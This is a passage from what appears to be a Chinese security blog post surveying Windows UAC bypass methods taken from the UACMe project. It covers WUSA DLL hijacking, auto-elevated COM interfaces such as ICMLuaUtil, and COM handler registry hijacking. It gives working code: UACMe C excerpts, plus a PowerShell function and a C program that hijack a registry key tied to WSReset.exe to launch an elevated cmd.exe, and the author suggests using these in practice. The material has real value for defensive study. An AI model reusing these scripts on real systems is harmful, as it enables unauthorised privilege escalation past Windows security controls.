通过WUSA将攻击者自动以DLL解压至C:\windwos\system32\Hibiki.dll下，然后运行cliconfg.exe即可在运行时自动加载Hibiki.dll，因为cliconfg.exe是AutoElevate的exe，所以Hiibiki.dll会以管理员权限运行，即绕过了UAC。
方法9使用了该技术:
    Author: Leo Davidson, WinNT/Simda, Win32/Carberp derivative
        Type: Dll Hijack
        Method: IFileOperation, ISecurityEditor, WUSA
        Target(s): IFEO registry keys, \system32\cliconfg.exe
        Component(s): Attacker defined Application Verifier Dll
        Implementation: ucmAvrfMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 TH1 (10147)
            How: WUSA /extract option removed, ISecurityEditor interface method changed
注意,由于是使用的WUSA来进行转移,所以同样也要构造一个cab格式的文件.
以上就是常见的通过DLL劫持的方式来BypassUAC的方法.
###  利用COM接口
####  COM简介
COM是Component Object Model （组件对象模型）的缩写。
COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。
#####  应用程序与COM注册表的关系 – CLSID
首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。
CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。位置在注册表的
_HKEY_CLASSES_ROOT\CLSID_
，这里存放了Windows系统组件对应的CLSID，选中某个CLSID，在右侧窗格中的“默认”值显示的“数据”即为该CLSID对应的系统组件名称，例如{26EE0668-A00A-44D7-9371-BEB064C98683}就是“控制面板”的CLSID。
可以有以下应用方式：
  * **方式一：** Win + R 快捷键调出“运行”对话框，输入 shell:::CLSID（例如 shell:::{26EE0668-A00A-44D7-9371-BEB064C98683} ），确定，即可打开“控制面板”（不是在cmd中）
  * **方式二：** 创建快捷方式。在创建快捷方式时，只需在“请键入对象的位置”文本框中输入 explorer shell:::CLSID（例如explorer shell:::{26EE0668-A00A-44D7-9371-BEB064C98683} ），那么使用创建的快捷方式打开“控制面板”；
  * **方式三：** 你也可以把某个系统组件的CLSID嵌入到应用软件中，以快速打开某组件；
####  利用可以Auto Approval的COM组件BypassUAC
对于这类BypassUAC，需要满足以下两点：
  1. elevation属性开启，且开启Auto Approval(需要利用这个特点绕过UAC)
  2. COM组件中的接口存在可以命令执行的地方(用来执行我们自己的命令)
举个例子，如41号方法：
    Author: Oddvar Moe
        Type: Elevated COM interface
        Method: ICMLuaUtil
        Target(s): Attacker defined
        Component(s): Attacker defined
        Implementation: ucmCMLuaUtilShellExecMethod
        Works from: Windows 7 (7600)
        Fixed in: unfixed 🙈
            How: -    
这个方法使用的是CMSTPLUA组件的ICMLuaUtil接口，我们对着上述两个特点看一下
这里建议下载一个[OleViewDotNet](https://github.com/tyranid/oleviewdotnet)工具，可以方便的查看系统中的COM接口属性信息，注意需要用管理员权限运行
Registry -> CLSIDs
在CLSID上右键 -> properties -> Elevation 可以看到该接口Enabled：True&Auto
Approval：True,满足上述第一个条件
鼠标悬浮在ICMLuaUtil上,可以看到虚函数表地址在cmlua.dll+0x7360的位置处
用IDA打开看一下,找到0x180007360的位置,可以看到ICMLuaUtil接口的虚函数表
满足了第二个条件,即通过调用`ShellExecuteEx`这个`Windows API`实现了命令执行
我们具体看一下实现过程:
关键代码在Source\Akagi\methods\api0cradle.c中的ucmCMLuaUtilShellExecMethod函数中定义,同样,调用该函数前需要用supMasqueradeProcess伪装成白名单,关键函数如下:
    NTSTATUS ucmCMLuaUtilShellExecMethod(
        _In_ LPWSTR lpszExecutable
    )
    {
        NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
        HRESULT          r = E_FAIL, hr_init;
        BOOL             bApprove = FALSE;
        ICMLuaUtil      *CMLuaUtil = NULL;
        hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); //初始化当前线程Com组件
          ......
            r = ucmAllocateElevatedObject(
                T_CLSID_CMSTPLUA,
                &IID_ICMLuaUtil,
                CLSCTX_LOCAL_SERVER,
                (void**)&CMLuaUtil);
                ......
            r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
                lpszExecutable,
                NULL,
                NULL,
                SEE_MASK_DEFAULT,
                SW_SHOW);
              ......
        if (CMLuaUtil != NULL) {
            CMLuaUtil->lpVtbl->Release(CMLuaUtil);
        }
        if (hr_init == S_OK)
            CoUninitialize();
        return MethodResult;
    }
ucmAllocateElevatedObject中用CoGetObject创建了一个以管理员权限运行的CMLuaUtil组件
然后用ShellExec传进来的lpszExecutable,也就是payload:
        if (g_ctx->OptionalParameterLength == 0)
            lpszParameter = g_ctx->szDefaultPayload;
        else
            lpszParameter = g_ctx->szOptionalParameter;
    return ucmCMLuaUtilShellExecMethod(lpszParameter);
定义在sup.c中,就是一行简单滴调用cmd.exe的命令
#####  寻找这类可利用接口
除了通过上面的方式在`OleView`中手动去找，还可以通过`UACMe`项目提供的`Yuubari`工具快速查看系统`UAC`设定信息以及所有可以利用的程序和`COM`组件,这个工具的使用上文已经详细说明了,这里我们来看一下日志内容,挑几个重点的说:
    ===============================================================
    [UacView] Basic UAC settings
    ===============================================================
    ElevationEnabled=Enabled
    VirtualizationEnabled=Enabled
    InstallerDetectEnabled=Enabled
    ConsentPromptBehaviorAdmin=5
    EnableSecureUIAPaths=1
    PromptOnSecureDesktop=Enabled
显示基本的UAC配置
    ===============================================================
    [UacView] Autoelevated COM objects
    ===============================================================
    EditionUpgradeHelper Class
    EditionUpgradeHelper
    \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{01776DF3-B9AF-4E50-9B1C-56E93116D704}
    CEIPLuaElevationHelper
    wercplsupport.dll
    Customer Experience Improvement Program
    \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{01D0A625-782D-4777-8D4E-547E6457FAD5}
罗列所有可以自动权限提升的COM对象
    ===============================================================
    [UacView] Autoelevated applications in Windows directory
    ===============================================================
    C:\Windows\System32\BitLockerWizardElev.exe
    requireAdministrator
    uiAccess=FALSE
    autoElevate=TRUE
罗列所有可以自动提升权限的应用(在windows目录下的)
####  劫持COM组件绕过UAC
这种方式的原理在于CLSID下的两个键名:InprocHandler32和InprocServer32:
  * InprocHandler32:指定应用程序使用的自定义处理程序
  * InprocServer32:注册32位进程所需要的模块、线程属性配置
    HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   
         {CLSID}       
        InprocServer32          (Default) = path          
        ThreadingModel         = value
#####  COM组件的加载过程
  1. HKCU\Software\Classes\CLSID
  2. HKCR\CLSID
  3. HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\
所以我们可以通过在COM组件注册表下创建InprocServer32键值并将其指向我们自己的payload DLL来实现COM组件的劫持
40号方法就是使用这种技术:
    Author: Ruben Boonen
        Type: COM Handler Hijack
        Method: Registry key manipulation
        Target(s): \system32\mmc.exe, \system32\recdisc.exe
        Component(s): Attacker defined
        Implementation: ucmCOMHandlersMethod
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 19H1 (18362)
            How: Side effect of Windows changes
流程如下:
  1. 将payload DLL先复制到temp下
  2. 在CLSID/{0A29FF9E-7F9C-4437-8B11-F424491E3931}下创建InprocServer32并将值指向刚刚解压出来的dll文件,ThreadingModel的值为Apartment
  3. 创建ShellFolder,把HideOnDesktopPerUser值改为空,把Attributes值改为0xF090013D,这是”combination of SFGAO flags”
  4. 用mmc.exe运行eventvwr.msc,即可完成劫持.
  5. 清理注册表
###  利用Shell API
这种方法主要是通过寻找autoElevated属性为true的程序,修改其注册表\shell\open\command的值,改成我们想要执行的paylaod,在该值中指明的字段会在这类程序运行时自动执行,类似于默认程序打开,当你以后运行该程序时,这个command命令都会自动执行
UACME原本项目中的方法…我尝试的时候有点bug,不知道是我系统的问题还是什么问题,后续研究一下..这里给一个win10仍可用的payload,利用到了WSReset.exe这个应用商店的程序,利用思路如下:
  1. 更改HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command的值为”C:\Windows\System32\cmd.exe /c start cmd.exe”
  2. 运行WSReset.exe
  3. 清理注册表
将大佬原本的ps版本payload稍作修改:
    function Invoke-WSResetBypass {
          Param (
          [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
          )
          $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
          $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
          New-Item $CommandPath -Force | Out-Null
          New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
          Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
          Write-Host "[+] Registry entry has been created successfully!"
          $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
          Write-Host "[+] Starting WSReset.exe"
          Write-Host "[+] Triggering payload.."
          Start-Sleep -Seconds 10
          if (Test-Path $filePath) {
          Remove-Item $filePath -Recurse -Force
          Write-Host "[+] Cleaning up registry entry"
          }
    }
    IEX Invoke-WSResetBypass;
用法`POWERSHELL -EXECUTIONPOLICY BYPASS -FILE
C:\Users\User\Desktop\BypassUAC.ps1`
改成C版本:
    #include 
    #include 
    int main(void)
    {
        LPCWSTR regname = L"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open";
        HKEY hkResult = NULL;
        const wchar_t * payload = L"C:\\Windows\\System32\\cmd.exe /c start cmd.exe";
        DWORD Len = wcslen(payload)*2 + 2;
        int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hkResult);
        ret = RegSetValueEx(hkResult, L"command", 0, REG_SZ, (BYTE*)payload, Len);
        if (ret == 0) {
            printf("success to write run key\n");
            RegCloseKey(hkResult);
        }
        else {
            printf("failed to open regedit.%d\n", ret);
            return 0;
        }
        printf("Starting WSReset.exe");
        system("C://Windows//System32//WSReset.exe");
        return 0;
    }
实际在测试的时候,我的Win10(10.0.19041.329)没有成功,似乎是我的注册表之前被改坏了,但是这种思路就是这样是没有问题的,大名鼎鼎的冰河木马和灰鸽子都是采用类似的方式来执行自己的exe的.
UACMe中还是有很多没有被修复的BypassUac的方法的,在实际使用中要结合具体的情况来选取使用的方式,msf中也有多种BypassUac的方法可以使用.BypassUac的方法比较多,单思路来说,大体思路都在上述的总结中了,目前为止这应该是相对比较全面的一片BypassUac的方法总结了,有任何有问题的地方,请各位大佬指正.
## 参考
  * 
  * 
  * 